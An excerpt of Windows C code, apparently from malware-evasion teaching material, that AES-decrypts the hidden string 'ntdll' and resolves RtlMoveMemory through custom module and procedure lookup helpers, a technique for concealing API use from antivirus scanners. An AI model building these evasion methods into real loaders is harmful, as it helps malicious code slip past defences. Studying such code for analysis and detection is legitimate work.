...
unsigned char ntdll[] =  { 0x3c, 0x4d, 0xb8, 0xfe, 0x60, 0x5b, 0x90, 0xea, 0xcc, 0x21, 0x5c, 0x9f, 0x9f, 0x8a, 0x30, 0x83 };
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
	...
	AESDecrypt((char*) ntdll, sizeof(ntdll), (char *) key, sizeof(key));
	ntdll[9] = '\0';
	...
	LPWSTR ntdllUnicode[32];

	
	MultiByteToWideChar(CP_OEMCP, 0, (LPCCH) kernel32, sizeof(kernel32), (LPWSTR)kernUnicode, 32);
	MultiByteToWideChar(CP_OEMCP, 0, (LPCCH) ntdll, sizeof(ntdll), (LPWSTR)ntdllUnicode, 32);
	...
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)ntdllUnicode), (char *) RtlMoveMemoryEnc);
